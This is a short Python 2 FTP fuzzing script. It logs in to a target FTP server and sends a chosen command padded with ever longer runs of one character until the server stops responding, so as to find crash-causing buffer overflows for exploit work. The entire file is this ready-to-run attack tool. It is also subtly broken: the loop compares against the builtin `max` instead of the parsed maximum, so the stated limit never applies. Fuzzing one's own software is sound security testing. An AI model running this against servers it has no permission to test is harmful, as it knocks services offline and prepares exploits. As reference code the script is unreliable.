#!/usr/bin/python

import sys
import socket

if len(sys.argv) != 6:
	print 'Usage: {} [Target-IP] [Port Number] [Payload] [Interval] [Maximum]'.format(sys.argv[0])
	print 'Example: {} 10.0.0.5 21 A 100 1000'.format(sys.argv[0])
	print 'Example will fuzz the defined FYP service with a series of payloads\nto include 100 \'A\'s, 200 \'A\'s, etc... up to the maximum of 1000'
	sys.exit()

target = str(sys.argv[1])
port = int(sys.argv[2])
char = str(sys.argv[3])
i = int(sys.argv[4])
interval = int(sys.argv[4])
maximum = int(sys.argv[5])

user = raw_input(str('Enter FTP username: '))
passwd = raw_input(str('Enter FTP password: '))
command = raw_input(str('Enter FTP command to fuzz: '))

while i <= max:
	try:
		payload = command + ' ' + (char * i)
		print 'Sending {} instances of payload ({}) to target'.format(str(i), char)
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connect = s.connect((target, port))
		s.recv(1024)
		s.send('USER ' + user + '\r\n')
		s.recv(1024)
		s.send('PASS ' + passwd + '\r\n')
		s.recv(1024)
		s.send(payload + '\r\n')
		s.send('QUIT\r\n')
		s.recv(1024)
		s.close()
		i = i + interval
	except KeyboardInterrupt:
		print '\nReceived CTRL + C ketstroke.\nExiting program'
		sys.exit()
	except:
		print '\nUnable to sned...Server may have crashed'
		sys.exit()

print '\nThere is no indication that the server has crashed'
